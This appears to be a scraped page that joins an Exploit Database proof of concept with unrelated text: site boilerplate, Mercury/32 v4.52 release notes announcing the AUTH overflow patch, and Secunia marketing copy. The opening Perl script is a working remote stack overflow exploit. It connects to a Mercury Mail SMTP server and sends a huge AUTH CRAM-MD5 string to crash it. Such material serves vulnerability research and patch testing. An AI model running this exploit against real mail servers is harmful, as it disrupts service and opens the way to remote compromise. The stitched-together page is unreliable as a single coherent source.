# Mercury Mail Transport System Remote Stack Based Overflow
# Overview
# Mercury Mail Transport System: Mercury is a free, standards-based mail server
# solution, providing comprehensive, fast server support for all major Internet e-
# mail protocols. It is supplied in two versions, one hosted on Windows systems,
# the other running as a set of NLMs on Novell NetWare file servers.
# Description
# There is a remotely exploitable stack based buffer overrun in the latest version of
# Mercury Mail Transport System. Specifically the SMTP Server does not properly
# handle long AUTH CRAM-MD5 strings resulting in a complete compromise of the
# underlying system.
# Proof of Concept
use IO::Socket;
use MIME::Base64;
$|=1;
$host = "localhost";
$a = "QUFB" x 10000;
my $sock = IO::Socket::INET->new(PeerAddr => "$host",
PeerPort => '25',
Proto => 'tcp');
print $sock "EHLO you\r\n";
print $sock "AUTH CRAM-MD5\r\n";
print $sock $a . "\r\n";
while(<$sock>) {
print;
}

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

| | **Mercury/32 v4.52 Released** | | --- |   **Mercury/32 v4.52 / Mercury/NLM v1.49, August 2007**  Mercury/32 v4.52 is a security patch release, addressing a serious weakness in the MercuryS SMTP server (specifically, a buffer overflow vulnerability in the way the server processes the AUTH command). All v4.x versions of Mercury earlier than v4.52 are vulnerable to this exploit, and users should regard the upgrade to v4.52 as mandatory. V4.52 also fixes and extends the "Save attachment to file" filtering rule action (the "Set" button now works correctly, and you can now specify either a filename or a directory as the destination for the rule), and corrects a problem in the IMAP server where attempts to create folders using characters outside the supported character set might cause crashes. Please [click here](downloads.htm) to go to the download pages and retrieve v4.52. A patched version of MercuryS suitable for use in Mercury v4.01b systems is [available here](patches-s3.htm) for sites who do not wish to upgrade to v4.5, but we strongly urge making the move to v4.5 as soon as possible. Otherwise, the feature set for v4.52 is the same as for v4.51, the release information for which is shown below.  Finally, for those sites still running the NLM version of Mercury, we have produced a patch for the NLM version, which is available on our [patches page](patches-s3.htm).  **Mercury/32 v4.51, June 2007**  It's been a long time between drinks... At first blush, not that much will seem to have changed between v4.01b and v4.5, but looks, as they say, can be deceiving. A huge amount of effort has gone into modernizing the internal Mercury code, with real emphasis on robustness and reliability. The most significant changes in this version are the following (if you don't want to read through this feature list, you can simply [click here](downloads.htm) to go to the downloads page and download the v4.51 installer):   * Queue overhaul  The   Mercury queueing mechanism (the part of the program   responsible for managing the queue of incoming and outgoing   mail) has been totally overhauled. The new version is   anything up to 100 times faster at traversing the queue,   which can have a really significant impact for sites   that handle large quantities of mail. The visible face   of this overhaul is the new queue indicators in the   core module window - these show the number of incoming   and outgoing jobs in the queue at any time, and give   you a general idea of the status of the queue in real   time.  * Memory management overhaul    Far and away the biggest, yet least visible change   in v4.5 is the way it handles memory allocation internally.   Previous versions of Mercury have had memory leak issues   to varying levels, some of which have been very hard   to track down: the new memory allocation architecture   in v4.5 has made memory leaks both much less likely   and trivially easy to locate and fix.  * Public folder delivery    Mercury can now deliver directly into Pegasus   Mail public folders, making this feature extremely powerful.   Public folder delivery is handled by a new type of alias,   and is easy to set up. Click here for more information.  * Disclaimer and text insertion   rules  An oft-requested feature for Mercury   is the ability to add disclaimer text to outgoing messages   - v4.5 can do this and more using a new filtering rule   action (meaning that you can insert text into both incoming   and outgoing messages, and you can do so selectively).   The process of inserting text into a mail message is   actually surprisingly complex, but the code in Mercury   is quite smart about it, handling all the most commonly-encountered   situations. Click here for more information.  * Filtering rules for outgoing   mail only  You can now create filtering   rules that are only applied to messages being sent outwards   from the system. Primarily added in support of the new   disclaimer addition rule (see above), this also allows   you to fine-tune mail leaving your system.  * MercuryI IMAP server improvements    The MercuryI IMAP server has been heavily overhauled   to make it more robust and reliable. It now supports   the IMAP AUTHENTICATE command and the use of a wide   range of international characters in folder names (using   the IMAP "modified UTF-7" encoding scheme).   Performance should also be noticeably faster for many   sites, especially those using IMAP-based web mail front   ends such as SquirrelMail.  * SSL support in MercuryD and   MercuryC  The MercuryD POP3 client and MercuryC   relaying SMTP client both now support SSL connections.  * Mercury Loader improved    We don't think Mercury/32 v4.5 will crash (of   course we have to say that)... But if it does, the loader   process that monitors it is now much smarter: it keeps   a log of restarts and is able to quarantine the Mercury   queue if it determines that a job with some error we   have not anticipated is causing repeated crashes. This   eliminates system down-time and reduces the likelihood   of any loss of mail due to queue errors to vanishingly   small levels.  * Delivery Status Notifications    Mercury can now be instructed to send periodic   status messages to message senders when their mail is   delayed in the queue for whatever reason.  * Delivery failure reporting   improvements  The MercuryC and MercuryE   SMTP modules now generate considerably better error   reports when problems are encountered during mail delivery.  * Mailing list editor improvements    The Mercury mailing list editor has been heavily   improved to make it more reliable when used on heavily   loaded systems. Some sites that previously reported   periodic crashes when trying to edit lists in the Mercury   GUI should now find these problems have gone. There   are also new options to create new lists using an existing   one as a template, and to adjust the order of moderators   in a list.  * Content Control editor revised    The Mercury Content Control editor can now handle   rule sets of any size, and supports multi-level undo,   find and replace and other standard text editing operations.  * SpamHalter, ClamWall and GreyWall included    Lukas Gebauer's proven SpamWall Bayesian Spam   Filtering technology has been renamed SpamHalter, and   is now included as a standard part of the Mercury distribution,   as is his ClamWall anti-virus filter interface and his   new GreyWall greylisting plugin. We encourage you to   support Lukas with donations at his web site if you   use these superb Mercury plugins.  * MercuryS deferred HELO processing    Many sites may wish to use Mercury's market-leading   SMTP transaction filtering capabilities to weed out   unwanted connections, but still allow users with no   choice of host to access the server. To do this, MercuryS   now allows you to apply filtering to SMTP HELO/EHLO   commands but defer the action until later: if the user   subsequently issues a successful AUTH command before   the action is taken, it is cancelled and the user is   allowed normal access.  * Many changes to Daemon processing    Mercury's Daemon (plugin) interface has been heavily   extended with a wide range of new capabilities.   **What's NOT in this version**  For a long time now, I have been saying that incorporating a native webmail interface into Mercury is my highest priority, and this is still true. Unfortunately, the process has proven to be much less simple than I thought (and I was not being over-optimistic). The problem is not the mail management, but the HTML: designing a usable, attractive HTML-based interface that will work with a wide range of browsers is staggeringly complicated, and frankly, it's beyond the scope of my personal skill set at this point.  Although I still intend in the strongest terms to have a fully-integrated native webmail facility in Mercury/32, it's clear that I'm going to need assistance from others to produce it. In the short term, we will be concentrating on putting together either installer packages or how-to guides for one or more of the most commonly-used IMAP-based webmail interfaces that are known to work well with Mercury - please watch our web site, http://www.pmail.com and our online knowledgebase, http://kbase.pmail.gen.nz for announcements of availability on these packages.  **Finally...**  Last year, one of my longest-standing testers and greatest supporters passed away after a tragic illness. Mercury/32 v4.5 is dedicated with love and sorrow to the memory of Merton Nickerson, a good friend, who is greatly missed.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
